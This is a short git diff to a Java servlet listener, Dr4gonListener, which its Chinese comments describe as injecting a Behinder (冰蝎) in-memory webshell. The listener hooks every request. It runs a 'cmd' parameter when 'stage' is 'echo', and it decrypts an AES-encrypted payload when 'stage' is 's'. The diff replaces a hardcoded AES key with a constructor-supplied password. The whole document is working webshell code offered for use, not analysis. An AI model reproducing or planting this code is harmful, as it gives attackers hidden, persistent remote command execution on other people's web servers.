@@ -17,6 +17,10 @@ import java.util.Base64;
 
 
 public class Dr4gonListener implements ServletRequestListener {
+    public Dr4gonListener (String pass){
+        this.pass=pass;
+    }
+    public String pass;
     @Override
     public void requestDestroyed(ServletRequestEvent servletRequestEvent) { }
     //listener实现回显+注入冰蝎内存马
@@ -29,7 +33,7 @@ public class Dr4gonListener implements ServletRequestListener {
             Request request = (Request) field.get(requestfacade);
             Response response = request.getResponse();
             HttpSession session = request.getSession();
-            PageContext pageContext = (PageContext) new Dr4gonContext(request, response, session);
+            PageContext pageContext = new ccdr4gon.utils.Dr4gonPageContext(request, response, session);
             //回显
             if (request.getParameter("stage").equals("echo")) {
                 String cmd=request.getParameter("cmd");
@@ -55,7 +59,7 @@ public class Dr4gonListener implements ServletRequestListener {
             }
             //注入冰蝎3内存马
             if (request.getParameter("stage").equals("s")) {
-                String k = "e45e329feb5d925b";
+                String k = pass;
                 session.putValue("u", k);
                 Cipher c = Cipher.getInstance("AES");
                 c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
